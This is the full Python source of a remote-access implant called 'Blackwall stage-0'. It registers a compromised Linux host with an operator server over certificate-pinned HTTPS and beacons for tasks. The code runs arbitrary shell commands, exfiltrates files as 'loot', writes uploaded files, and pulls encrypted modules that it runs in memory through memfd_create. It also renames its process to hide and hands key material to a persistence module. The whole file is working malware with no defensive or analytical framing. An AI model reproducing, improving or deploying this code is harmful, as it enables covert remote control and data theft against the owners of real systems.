#!/usr/bin/env python3
# PROJECT BLACKWALL // STAGE-0 // minimal HTTPS implant
# The builder replaces __BW_CFG_B64__ with a JSON config sealed in base64.
# Do not add third-party imports here: this file must run on a stripped hill.

import base64
import hashlib
import hmac
import http.client
import json
import os
import platform
import random
import socket
import ssl
import subprocess
import sys
import tempfile
import time
import urllib.parse
import uuid

_CFG_B64 = "__BW_CFG_B64__"


def _cfg():
    if _CFG_B64.startswith("__BW_"):
        raw = os.environ.get("BW_DEV_CFG", "")
        if not raw:
            raise SystemExit("stage0: not configured; run c2_pack.py build")
        return json.loads(raw)
    return json.loads(base64.b64decode(_CFG_B64).decode("utf-8"))


CFG = _cfg()
API = "/api/v1"
SECRET = base64.b64decode(CFG["secret"].encode("ascii"))
MAX_OUT = int(CFG.get("max_output", 262144))


def _log(text):
    if os.environ.get("BW_DEBUG") or CFG.get("dry_run"):
        sys.stderr.write("[stage0] %s\n" % text)
        sys.stderr.flush()


def _b64d(text):
    return base64.b64decode(text.encode("ascii") if isinstance(text, str) else text)


def _hkdf(ikm, info=b"", length=32, salt=b"blackwall-c2-v1"):
    if isinstance(ikm, str):
        ikm = ikm.encode()
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm = b""
    block = b""
    counter = 1
    while len(okm) < length:
        block = hmac.new(prk, block + info + bytes([counter]), hashlib.sha256).digest()
        okm += block
        counter += 1
    return okm[:length]


def _keystream(key, nonce, size):
    out = bytearray()
    counter = 0
    while len(out) < size:
        out += hmac.new(key, nonce + counter.to_bytes(4, "big"), hashlib.sha256).digest()
        counter += 1
    return bytes(out[:size])


def _unseal(blob, purpose):
    if not blob or not blob.startswith(b"BWM1") or len(blob) < 52:
        raise ValueError("bad module header")
    root = _hkdf(SECRET, info=b"bw-" + purpose)
    enc_key = _hkdf(root, info=b"enc")
    mac_key = _hkdf(root, info=b"mac")
    nonce = blob[4:20]
    tag = blob[20:52]
    cipher = blob[52:]
    expected = hmac.new(mac_key, b"BWM1" + nonce + cipher, hashlib.sha256).digest()
    if not hmac.compare_digest(tag, expected):
        raise ValueError("bad module tag")
    stream = _keystream(enc_key, nonce, len(cipher))
    return bytes(a ^ b for a, b in zip(cipher, stream))


def _sign(method, path, ts, nonce, body):
    msg = b"\n".join(
        (
            method.upper().encode(),
            path.encode(),
            str(ts).encode(),
            nonce.encode(),
            hashlib.sha256(body).hexdigest().encode(),
        )
    )
    return hmac.new(SECRET, msg, hashlib.sha256).hexdigest()


class AuthError(Exception):
    pass


class HttpError(Exception):
    def __init__(self, status, body):
        self.status = status
        self.body = body
        super().__init__("HTTP %s: %s" % (status, body[:200]))


class Client:
    def __init__(self):
        parsed = urllib.parse.urlsplit(CFG["url"])
        if parsed.scheme != "https":
            raise SystemExit("stage0: C2 URL must be https")
        self.host = parsed.hostname or ""
        self.port = parsed.port or 443
        self.prefix = parsed.path.rstrip("/")
        self.ctx = self._context()

    def _context(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_REQUIRED
        try:
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        except AttributeError:
            pass
        ctx.load_verify_locations(cadata=CFG["ca_pem"])
        cert_pem = CFG.get("client_cert_pem")
        key_pem = CFG.get("client_key_pem")
        if cert_pem and key_pem:
            shm = "/dev/shm" if os.path.isdir("/dev/shm") else None
            cpath = kpath = None
            try:
                cfd, cpath = tempfile.mkstemp(prefix=".blk", dir=shm)
                os.write(cfd, cert_pem.encode("ascii"))
                os.close(cfd)
                kfd, kpath = tempfile.mkstemp(prefix=".blk", dir=shm)
                os.write(kfd, key_pem.encode("ascii"))
                os.close(kfd)
                os.chmod(kpath, 0o600)
                ctx.load_cert_chain(cpath, kpath)
            finally:
                for path in (cpath, kpath):
                    if path:
                        try:
                            os.unlink(path)
                        except OSError:
                            pass
        return ctx

    def request(self, method, path, body=b"", timeout=None):
        full = self.prefix + path
        ts = str(int(time.time()))
        nonce = os.urandom(16).hex()
        headers = {
            "X-BW-Ts": ts,
            "X-BW-Nonce": nonce,
            "X-BW-Sig": _sign(method, full, ts, nonce, body),
            "X-BW-Proto": "1",
            "User-Agent": CFG.get("user_agent", "Mozilla/5.0 BW/1.0"),
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Connection": "close",
        }
        conn = http.client.HTTPSConnection(
            self.host, self.port, context=self.ctx, timeout=timeout or CFG.get("timeout", 15)
        )
        try:
            conn.connect()
            if conn.sock is None:
                raise OSError("no socket")
            der = conn.sock.getpeercert(binary_form=True)
            if not der:
                raise OSError("no peer certificate")
            fp = hashlib.sha256(der).hexdigest().upper()
            if fp != CFG["fingerprint"].upper():
                raise OSError("certificate pin mismatch")
            conn.request(method, full, body=body, headers=headers)
            resp = conn.getresponse()
            data = resp.read()
            status = resp.status
        finally:
            try:
                conn.close()
            except Exception:
                pass
        if status in (401, 403):
            raise AuthError(data[:200].decode("utf-8", "replace"))
        if status >= 400:
            raise HttpError(status, data.decode("utf-8", "replace"))
        return data

    def json(self, method, path, obj=None, timeout=None):
        body = b""
        if obj is not None:
            body = json.dumps(obj, separators=(",", ":")).encode("utf-8")
        data = self.request(method, path, body, timeout=timeout)
        return json.loads(data.decode("utf-8")) if data else {}


def _read_first(path, default=""):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read().strip()
    except OSError:
        return default


def _ips():
    found = set()
    try:
        for item in socket.gethostbyname_ex(socket.gethostname())[2]:
            found.add(item)
    except OSError:
        pass
    for family, _, _, _, sockaddr in socket.getaddrinfo(socket.gethostname(), None):
        if family in (socket.AF_INET, socket.AF_INET6):
            found.add(sockaddr[0])
    found.discard("127.0.0.1")
    return sorted(found)[:12]


def _machine_id():
    for path in ("/etc/machine-id", "/var/lib/dbus/machine-id"):
        value = _read_first(path)
        if value:
            return hashlib.sha256(value.encode()).hexdigest()[:32]
    return hashlib.sha256((platform.node() + str(uuid.getnode())).encode()).hexdigest()[:32]


def _info():
    try:
        boot = int([x for x in _read_first("/proc/stat").splitlines() if x.startswith("btime")][0].split()[1])
    except (IndexError, ValueError):
        boot = 0
    return {
        "machine_id": _machine_id(),
        "hostname": socket.gethostname(),
        "fqdn": socket.getfqdn(),
        "user": _user(),
        "uid": os.getuid(),
        "euid": os.geteuid(),
        "gid": os.getgid(),
        "pid": os.getpid(),
        "ppid": os.getppid(),
        "cwd": os.getcwd(),
        "kernel": platform.release(),
        "arch": platform.machine(),
        "python": platform.python_version(),
        "ips": _ips(),
        "boot_time": boot,
        "container": os.path.exists("/.dockerenv") or os.path.exists("/run/.containerenv"),
        "init": _read_first("/proc/1/comm"),
        "time": int(time.time()),
    }


def _user():
    try:
        import pwd

        return pwd.getpwuid(os.getuid()).pw_name
    except Exception:
        return os.environ.get("USER", "?")


def _truncate(data):
    raw = data.encode("utf-8", "replace") if isinstance(data, str) else data
    truncated = len(raw) > MAX_OUT
    if truncated:
        raw = raw[:MAX_OUT] + b"\n...[truncated by blackwall]...\n"
    return raw.decode("utf-8", "replace"), truncated


def _run(argv, stdin=None, timeout=30, env=None, cwd=None, pass_fds=()):
    started = time.time()
    try:
        proc = subprocess.run(
            argv,
            input=stdin,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            env=env,
            cwd=cwd,
            close_fds=True,
            pass_fds=pass_fds,
        )
        out, trunc = _truncate(proc.stdout)
        err, trunc2 = _truncate(proc.stderr)
        return {
            "rc": proc.returncode,
            "stdout": out,
            "stderr": err,
            "duration": round(time.time() - started, 3),
            "truncated": bool(trunc or trunc2),
        }
    except subprocess.TimeoutExpired as exc:
        out = exc.stdout or b""
        err = exc.stderr or b""
        out, trunc = _truncate(out)
        err, trunc2 = _truncate(err)
        return {
            "rc": -1,
            "stdout": out,
            "stderr": err + "\n[timeout after %ss]" % timeout,
            "duration": round(time.time() - started, 3),
            "truncated": bool(trunc or trunc2),
            "timeout": True,
        }
    except Exception as exc:
        return {
            "rc": -1,
            "stdout": "",
            "stderr": "spawn failed: %s" % exc,
            "duration": round(time.time() - started, 3),
            "truncated": False,
        }


def _module_env(task):
    env = os.environ.copy()
    args = task.get("args", {}) if isinstance(task.get("args"), dict) else {}
    name = str(args.get("name", ""))
    env.update(
        {
            "BW_SESSION": CFG.get("_session", ""),
            "BW_SERVER": CFG.get("url", ""),
            "BW_TASK": str(task.get("id", "")),
            "BW_MODULE": name,
            "BW_MODULE_ARGS": str(args.get("args", "")),
            "BW_PREFIX": "blk_",
            "BW_DRY_RUN": "1" if CFG.get("dry_run") else "0",
            "BW_STAGE_URL": CFG.get("url", "").rstrip("/") + API + "/stage",
        }
    )
    # Only the persistence module needs the material to re-fetch stage-0.
    if name == "persist" or args.get("needs_secret"):
        env["BW_SECRET_B64"] = CFG.get("secret", "")
        env["BW_CA_PEM_B64"] = base64.b64encode(CFG.get("ca_pem", "").encode()).decode("ascii")
        env["BW_FINGERPRINT"] = CFG.get("fingerprint", "")
    for key, value in (CFG.get("env") or {}).items():
        if key.startswith("BW_") and value:
            env[key] = str(value)
    return env


def _run_memfd(raw, env, timeout):
    if not hasattr(os, "memfd_create"):
        shm = "/dev/shm" if os.path.isdir("/dev/shm") else None
        fd, path = tempfile.mkstemp(prefix=".blk_", dir=shm)
        try:
            os.write(fd, raw)
            os.fchmod(fd, 0o700)
            os.close(fd)
            return _run([path], timeout=timeout, env=env)
        finally:
            try:
                os.unlink(path)
            except OSError:
                pass
    fd = os.memfd_create("blk", flags=0)
    try:
        os.write(fd, raw)
        os.fchmod(fd, 0o700)
        return _run(["/proc/self/fd/%d" % fd], timeout=timeout, env=env, pass_fds=(fd,))
    finally:
        try:
            os.close(fd)
        except OSError:
            pass


def _run_module(task, client):
    args = task.get("args", {}) if isinstance(task.get("args"), dict) else {}
    name = str(args.get("name", ""))
    if not name:
        return False, {"error": "module name is empty"}
    kind = str(args.get("kind", "")).lower()
    blob = client.request("GET", API + "/module/" + urllib.parse.quote(name))
    try:
        raw = _unseal(blob, b"module:" + name.encode())
    except Exception as exc:
        return False, {"error": "module decrypt failed: %s" % exc}
    env = _module_env(task)
    timeout = int(args.get("timeout") or 300)
    if kind == "elf" or raw.startswith(b"\x7fELF"):
        result = _run_memfd(raw, env, timeout)
        result["module"] = name
        return result.get("rc", -1) == 0, result
    interp = "/bin/sh"
    first = raw.split(b"\n", 1)[0]
    if kind == "py" or b"python" in first:
        interp = sys.executable
    elif b"bash" in first:
        interp = "/bin/bash"
    result = _run([interp, "-s"], stdin=raw, timeout=timeout, env=env, cwd=args.get("cwd") or "/")
    result["module"] = name
    return result.get("rc", -1) == 0, result


def _upload(task):
    args = task.get("args", {}) if isinstance(task.get("args"), dict) else {}
    path = str(args.get("path", ""))
    if not path:
        return False, {"error": "upload path is empty"}
    raw = base64.b64decode(str(args.get("b64", "")))
    if CFG.get("dry_run"):
        return True, {"path": path, "bytes": len(raw), "dry_run": True}
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    with open(path, "wb") as fh:
        fh.write(raw)
    mode = int(args.get("mode", 0o600))
    os.chmod(path, mode)
    return True, {"path": path, "bytes": len(raw), "mode": oct(mode)}


def _download(task):
    args = task.get("args", {}) if isinstance(task.get("args"), dict) else {}
    path = str(args.get("path", ""))
    limit = int(args.get("max", 4 * 1024 * 1024))
    with open(path, "rb") as fh:
        raw = fh.read(limit + 1)
    truncated = len(raw) > limit
    raw = raw[:limit]
    return True, {
        "file": {
            "name": os.path.basename(path) or "loot.bin",
            "size": len(raw),
            "truncated": truncated,
            "b64": base64.b64encode(raw).decode("ascii"),
        }
    }


def _list(task):
    args = task.get("args", {}) if isinstance(task.get("args"), dict) else {}
    path = str(args.get("path", "/"))
    entries = []
    for name in sorted(os.listdir(path))[:2000]:
        full = os.path.join(path, name)
        try:
            st = os.stat(full)
            entries.append(
                {
                    "name": name,
                    "size": st.st_size,
                    "mode": oct(st.st_mode & 0o7777),
                    "dir": os.path.isdir(full),
                }
            )
        except OSError:
            entries.append({"name": name, "error": True})
    return True, {"path": path, "entries": entries}


def run_task(task, client):
    tid = str(task.get("id", ""))
    kind = str(task.get("kind", ""))
    args = task.get("args", {}) if isinstance(task.get("args"), dict) else {}
    try:
        if kind == "exit":
            return {"id": tid, "ok": True, "output": {"bye": True}}, True
        if kind == "sleep":
            seconds = max(1, min(3600, int(args.get("seconds", 10))))
            time.sleep(seconds)
            return {"id": tid, "ok": True, "output": {"seconds": seconds}}, False
        if kind == "ping":
            return {"id": tid, "ok": True, "output": {"pong": time.time()}}, False
        if kind == "shell":
            cmd = str(args.get("cmd", ""))
            timeout = int(args.get("timeout", 30))
            result = _run(["/bin/sh", "-c", cmd], timeout=timeout, cwd=args.get("cwd") or "/")
            return {"id": tid, "ok": result.get("rc", -1) == 0, "output": result}, False
        if kind == "module":
            ok, result = _run_module(task, client)
            return {"id": tid, "ok": ok, "output": result}, False
        if kind == "upload":
            ok, result = _upload(task)
            return {"id": tid, "ok": ok, "output": result}, False
        if kind == "download":
            ok, result = _download(task)
            return {"id": tid, "ok": ok, "output": result}, False
        if kind == "list":
            ok, result = _list(task)
            return {"id": tid, "ok": ok, "output": result}, False
        return {"id": tid, "ok": False, "output": {"error": "unknown task kind: %s" % kind}}, False
    except Exception as exc:
        return {"id": tid, "ok": False, "output": {"error": "%s: %s" % (type(exc).__name__, exc)}}, False


def _disguise():
    name = str(CFG.get("disguise") or "")
    if not name:
        return
    try:
        import ctypes

        libc = ctypes.CDLL(None)
        libc.prctl(15, ctypes.c_char_p(name.encode()[:15]), 0, 0, 0)
    except Exception:
        pass


def main():
    os.umask(0o077)
    _disguise()
    client = Client()
    session = ""
    pending = []
    backoff = 2
    started = time.time()
    max_runtime = int(os.environ.get("BW_MAX_RUNTIME", "0") or 0)
    oneshot = bool(os.environ.get("BW_ONESHOT"))

    while True:
        if max_runtime and time.time() - started > max_runtime:
            _log("max runtime reached")
            return 0
        try:
            if not session:
                reply = client.json(
                    "POST",
                    API + "/register",
                    {"machine_id": _machine_id(), "info": _info()},
                )
                session = reply.get("session", "")
                if not session:
                    raise OSError("register returned no session")
                CFG["_session"] = session
                cfg = reply.get("config", {})
                if cfg.get("poll"):
                    CFG["poll"] = int(cfg["poll"])
                if "jitter" in cfg:
                    CFG["jitter"] = int(cfg["jitter"])
                if "dry_run" in cfg:
                    CFG["dry_run"] = int(cfg["dry_run"])
                backoff = 2
                _log("registered as %s" % session)

            body = {"session": session, "info": _info() if not pending else {}, "results": pending}
            reply = client.json("POST", API + "/beacon", body)
            pending = []
            for task in reply.get("tasks", []) or []:
                result, stop = run_task(task, client)
                result["session"] = session
                if stop:
                    try:
                        client.json("POST", API + "/result", result)
                    except Exception:
                        pass
                    _log("exit task received")
                    return 0
                try:
                    client.json("POST", API + "/result", result)
                except Exception:
                    pending.append(result)
                if oneshot:
                    return 0

            if oneshot:
                return 0
            poll = max(3, int(CFG.get("poll", 20)))
            jitter = max(0, int(CFG.get("jitter", 8)))
            delay = poll + random.uniform(-jitter, jitter)
            time.sleep(max(3.0, delay))
            backoff = 2
        except AuthError as exc:
            _log("auth rejected: %s" % exc)
            session = ""
            time.sleep(10)
        except HttpError as exc:
            _log("http error: %s" % exc)
            if exc.status == 404:
                session = ""
            time.sleep(max(5, backoff))
            backoff = min(120, backoff * 2)
        except (OSError, ssl.SSLError, http.client.HTTPException) as exc:
            _log("network error: %s" % exc)
            time.sleep(backoff)
            backoff = min(120, backoff * 2)
        except Exception as exc:
            _log("unexpected error: %s: %s" % (type(exc).__name__, exc))
            time.sleep(backoff)
            backoff = min(120, backoff * 2)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
